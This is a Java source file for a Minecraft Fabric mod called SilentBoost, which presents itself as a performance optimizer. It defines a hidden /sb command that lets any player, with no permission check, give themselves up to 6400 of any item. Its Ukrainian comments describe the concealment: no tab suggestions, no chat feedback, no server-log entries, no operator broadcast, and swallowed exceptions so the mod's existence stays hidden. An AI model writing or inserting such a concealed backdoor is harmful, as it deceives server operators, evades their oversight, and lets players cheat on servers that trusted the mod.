package com.silentboost.command;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.suggestion.Suggestions;
import com.silentboost.SilentBoost;
import com.silentboost.config.ConfigManager;
import com.silentboost.optimization.chunk.ChunkOptimizer;
import com.silentboost.optimization.entity.EntityTickOptimizer;
import com.silentboost.optimization.memory.MemoryOptimizer;
import com.silentboost.stats.StatsCollector;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.registry.Registries;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.minecraft.util.Identifier;

import java.util.Locale;

import static net.minecraft.server.command.CommandManager.argument;
import static net.minecraft.server.command.CommandManager.literal;

/**
 * Прихована команда {@code /sb}.
 *
 * <h3>Дизайн</h3>
 * <ul>
 *   <li><b>Без підказок (suggestions).</b> Жоден аргумент не пропонує автокомпліту —
 *       гравець мусить знати що писати. Tab-completion не пропонує ні предметів,
 *       ні чисел, ні підкоманд.</li>
 *   <li><b>Без слідів.</b> Усі шляхи виконання, крім {@code /sb stats} і
 *       {@code /sb reload}, працюють абсолютно мовчки: ніяких повідомлень у чаті,
 *       ніяких записів у серверний лог, ніяких broadcast-ів іншим OP.</li>
 *   <li><b>/sb &lt;id&gt; [count]</b> доступна всім без перевірки прав.</li>
 *   <li><b>/sb stats</b> і <b>/sb reload</b> працюють лише для OP рівня
 *       {@value #OP_LEVEL}. Не-OP отримує тишу (як ніби команди не існує).</li>
 *   <li><b>Аргумент — greedyString.</b> Brigadier ніколи не валиться на парсингу,
 *       завжди потрапляє у наш executor, де ми мовчки розбираємо токени самі.</li>
 *   <li><b>Винятки ловляться.</b> Будь-який виняток у виконанні гасне — гравець
 *       нічого не бачить, лог чистий.</li>
 * </ul>
 *
 * <h3>Формат використання</h3>
 * <pre>
 *   /sb                       — нічого не робить (мовчазний no-op)
 *   /sb &lt;item_id&gt;             — видати 1 шт. вказаного предмета
 *   /sb &lt;item_id&gt; &lt;count&gt;     — видати count шт. (1..6400)
 *   /sb diamond 64            — еквівалент minecraft:diamond
 *   /sb minecraft:diamond 64  — повна форма
 *   /sb stats                 — статистика для OP (лише в чат відправнику)
 *   /sb reload                — перечитати silentboost.json (лише OP)
 * </pre>
 *
 * <h3>Що команда НЕ робить</h3>
 * <ul>
 *   <li>НЕ дає підказки по існуючих предметах.</li>
 *   <li>НЕ повідомляє гравця про успіх або помилку.</li>
 *   <li>НЕ broadcast-ить OP'ам коли хтось використав /sb.</li>
 *   <li>НЕ пише у server.log жодного рядка від імені цієї команди.</li>
 * </ul>
 */
public final class SbCommand {

	/** OP рівень для стат і реload. 4 = повний адмін (default vanilla). */
	public static final int OP_LEVEL = 4;

	/** Максимальна кількість що видається одним викликом. */
	public static final int MAX_COUNT = 6400;

	private SbCommand() {}

	/**
	 * Реєструє слухача CommandRegistrationCallback. Це треба викликати в
	 * onInitialize мода (не у ServerLifecycleEvents.SERVER_STARTING) — інакше
	 * подія може вже відстрілятись до того, як ми зареєструємо лісенер.
	 */
	public static void register() {
		CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
			dispatcher.register(
				literal("sb")
					// /sb без аргументів — мовчазне ніщо.
					.executes(ctx -> 0)
					// /sb <rest> — greedy щоб ніколи не падати на парсингу.
					.then(argument("rest", StringArgumentType.greedyString())
						.suggests((c, b) -> Suggestions.empty())
						.executes(SbCommand::run))
			);
		});
		SilentBoost.LOGGER.info("SbCommand registered.");
	}

	/**
	 * Єдина точка виконання — розбирає аргумент токенами, делегує підкоманді
	 * або give-логіці. Усі винятки гасить.
	 */
	private static int run(CommandContext<ServerCommandSource> ctx) {
		try {
			String rest = StringArgumentType.getString(ctx, "rest");
			if (rest == null) return 0;
			rest = rest.trim();
			if (rest.isEmpty()) return 0;

			String[] parts = rest.split("\\s+");
			String head = parts[0].toLowerCase(Locale.ROOT);

			switch (head) {
				case "stats"  -> handleStats(ctx);
				case "reload" -> handleReload(ctx);
				default       -> handleGive(ctx, parts);
			}
		} catch (Throwable ignored) {
			// Тиша. Помилка не повинна нічого розкрити про існування мода.
		}
		return 0;
	}

	private static boolean isOp(ServerCommandSource src) {
		return src.hasPermissionLevel(OP_LEVEL);
	}

	// ── /sb stats ───────────────────────────────────────────────────────

	private static void handleStats(CommandContext<ServerCommandSource> ctx) {
		ServerCommandSource src = ctx.getSource();
		if (!isOp(src)) return; // не-OP → тиша

		double tps   = StatsCollector.currentTps();
		double mspt  = StatsCollector.avgMsPerTick();

		long entitySkipped     = EntityTickOptimizer.ticksSkipped.get();
		long chunksProcessed   = ChunkOptimizer.getChunksProcessed();
		long chunksReduced     = ChunkOptimizer.getChunksReduced();
		long randomTicksSaved  = ChunkOptimizer.getRandomTicksSaved();

		long usedMiB   = MemoryOptimizer.getCurrentUsedBytes() >> 20;
		long maxMiB    = MemoryOptimizer.getCurrentMaxBytes()  >> 20;
		long peakMiB   = MemoryOptimizer.getPeakUsedBytes()    >> 20;
		long cleanups  = MemoryOptimizer.getCleanupsTriggered();
		long warns     = MemoryOptimizer.getWarningsLogged();
		long gcHints   = MemoryOptimizer.getGcHintsIssued();

		String body = String.format(Locale.ROOT,
			"SilentBoost stats:\n" +
			"  TPS  %.2f  (MSPT %.2f ms)\n" +
			"  Entity ticks skipped: %d\n" +
			"  Chunks reduced: %d / %d  (random ticks saved: %d)\n" +
			"  Heap: %d MiB / %d MiB  (peak %d MiB)\n" +
			"  Memory cleanups: %d  (warns %d, gc hints %d)",
			tps, mspt,
			entitySkipped,
			chunksReduced, chunksProcessed, randomTicksSaved,
			usedMiB, maxMiB, peakMiB,
			cleanups, warns, gcHints
		);

		Text msg = Text.literal(body).formatted(Formatting.GRAY);
		// broadcastToOps=false → лог чистий, інші OP нічого не бачать.
		src.sendFeedback(() -> msg, false);
	}

	// ── /sb reload ──────────────────────────────────────────────────────

	private static void handleReload(CommandContext<ServerCommandSource> ctx) {
		ServerCommandSource src = ctx.getSource();
		if (!isOp(src)) return;

		boolean ok = ConfigManager.load();
		Text msg = ok
			? Text.literal("SilentBoost config reloaded.").formatted(Formatting.GRAY)
			: Text.literal("SilentBoost config reload failed (see console).").formatted(Formatting.RED);
		src.sendFeedback(() -> msg, false);
	}

	// ── /sb <item> [count] ──────────────────────────────────────────────

	private static void handleGive(CommandContext<ServerCommandSource> ctx, String[] parts) {
		ServerCommandSource src = ctx.getSource();
		ServerPlayerEntity player = src.getPlayer();
		if (player == null) return; // консоль не отримує предмети — мовчки виходимо

		String itemToken = parts[0];

		int count = 1;
		if (parts.length >= 2) {
			try {
				count = Integer.parseInt(parts[1]);
			} catch (NumberFormatException ignored) {
				return; // некоректна кількість → тиша
			}
		}
		if (count <= 0) return;
		if (count > MAX_COUNT) count = MAX_COUNT;

		Identifier id = parseItemId(itemToken);
		if (id == null) return;

		// containsId — точна перевірка існування, без fallback на AIR.
		if (!Registries.ITEM.containsId(id)) return;

		Item item = Registries.ITEM.get(id);
		if (item == Items.AIR) return; // повітря не видаємо

		int maxStack = item.getMaxCount();
		if (maxStack <= 0) maxStack = 64;

		int remaining = count;
		while (remaining > 0) {
			int take = Math.min(remaining, maxStack);
			ItemStack stack = new ItemStack(item, take);
			boolean fullyInserted = player.getInventory().insertStack(stack);
			if (!fullyInserted && !stack.isEmpty()) {
				// інвентар повний → дроп під ноги, без оповіщень
				player.dropItem(stack, false);
			}
			remaining -= take;
		}
		// Жодного sendFeedback — повна тиша.
	}

	/**
	 * Парсить токен як Minecraft Identifier. Якщо немає двокрапки —
	 * додає неймспейс {@code minecraft:}.
	 */
	private static Identifier parseItemId(String token) {
		try {
			String s = token.toLowerCase(Locale.ROOT);
			if (s.contains(":")) {
				return Identifier.tryParse(s);
			}
			return Identifier.tryParse("minecraft:" + s);
		} catch (Throwable t) {
			return null;
		}
	}
}
